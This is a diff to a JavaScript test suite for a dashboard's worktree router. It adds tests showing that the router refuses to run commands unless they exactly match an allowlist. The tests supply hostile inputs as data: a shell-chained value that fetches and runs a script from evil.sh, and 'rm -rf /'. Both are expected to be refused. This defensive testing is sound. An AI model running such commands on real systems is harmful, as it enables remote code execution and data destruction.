@@ -94,6 +94,7 @@ stubApp.use('/api', createWorktreesRouter({
   WORKTREE_ROOT: '/tmp/wt',
   TMUX_ENABLED: true,
   TMUX_SESSION: 'agentboard',
+  ALLOWED_COMMANDS: ['npm test'],
 }));
 const stubServer = stubApp.listen(0);
 const stubBase = `http://127.0.0.1:${stubServer.address().port}`;
@@ -182,7 +183,7 @@ console.log('  ✅ ?keepWorktree=true kills the window but keeps the checkout');
 // worktree root, because that would put concurrent agents in one working tree.
 
 /** Build a router whose executor fails for commands matching `failOn`. */
-function makeApp({ failOn = () => false, workspaceRoot = '/tmp/workspace' } = {}) {
+function makeApp({ failOn = () => false, workspaceRoot = '/tmp/workspace', allowed = ['npm test'] } = {}) {
   const log = [];
   const exec = async (cmd, args) => {
     log.push({ cmd, args });
@@ -194,7 +195,7 @@ function makeApp({ failOn = () => false, workspaceRoot = '/tmp/workspace' } = {}
   a.use(express.json());
   a.use('/api', createWorktreesRouter({
     execFileAsync: exec, WORKSPACE_ROOT: workspaceRoot, WORKTREE_ROOT: '/tmp/wt',
-    TMUX_ENABLED: true, TMUX_SESSION: 'agentboard',
+    TMUX_ENABLED: true, TMUX_SESSION: 'agentboard', ALLOWED_COMMANDS: allowed,
   }));
   const s = a.listen(0);
   return { log, base: `http://127.0.0.1:${s.address().port}`, close: () => s.close() };
@@ -251,6 +252,45 @@ const create = (base, body) => fetch(`${base}/api/worktrees`, {
   assert.ok(t.log.some(c => c.cmd === 'git' && c.args[1] === 'remove'), 'worktree removed after failed delivery');
   t.close();
   console.log('  ✅ send-keys fails → 503, window killed and worktree removed');
+}
+
+// ── Command execution is fail-closed, independent of the feature flag ────────
+// The dashboard has no per-route auth, so this allowlist is what bounds what a
+// caller who can reach the port is able to execute.
+{
+  // Empty allowlist (the default): commands are refused outright.
+  const t = makeApp({ allowed: [] });
+  const res = await create(t.base, { name: 'no-allowlist', command: 'npm test' });
+  assert.strictEqual(res.status, 403, 'command with empty allowlist → 403');
+  const d = await res.json();
+  assert.match(d.error, /AGENT_BOARD_TMUX_ALLOWED_COMMANDS/, 'error names the allowlist env var');
+  assert.ok(!t.log.some(c => c.cmd === 'tmux' && c.args[0] === 'send-keys'), 'nothing was executed');
+  assert.ok(!t.log.some(c => c.cmd === 'tmux' && c.args[0] === 'new-window'), 'rejected before any window is created');
+
+  // A worktree with no command is still allowed — the feature still works.
+  const ok = await create(t.base, { name: 'no-command' });
+  assert.strictEqual(ok.status, 201, 'creating a worktree without a command still works');
+  assert.strictEqual((await ok.json()).worktree.commandSent, false);
+  t.close();
+  console.log('  ✅ empty allowlist → 403 for commands, but worktree creation still works');
+}
+{
+  const t = makeApp({ allowed: ['npm test'] });
+  // Exact match only: a command that merely starts with an allowed one is refused,
+  // since tmux runs the string in a shell.
+  const sneaky = await create(t.base, { name: 'sneaky', command: 'npm test; curl evil.sh | sh' });
+  assert.strictEqual(sneaky.status, 403, 'prefix of an allowed command is still refused');
+  assert.ok(!t.log.some(c => c.cmd === 'tmux' && c.args[0] === 'send-keys'), 'shell-chained command never executed');
+
+  assert.strictEqual((await create(t.base, { name: 'other', command: 'rm -rf /' })).status, 403, 'unlisted command refused');
+
+  const allowedRes = await create(t.base, { name: 'allowed-one', command: 'npm test' });
+  assert.strictEqual(allowedRes.status, 201, 'exactly-matching command is allowed');
+  assert.strictEqual((await allowedRes.json()).worktree.commandSent, true);
+  assert.ok(t.log.some(c => c.cmd === 'tmux' && c.args[0] === 'send-keys' && c.args.includes('npm test')),
+    'allowlisted command is delivered');
+  t.close();
+  console.log('  ✅ allowlist is exact-match: shell-chained variants refused, exact match runs');
 }
 
 // ── GET reports the real branch for a custom-branch worktree ─────────────────
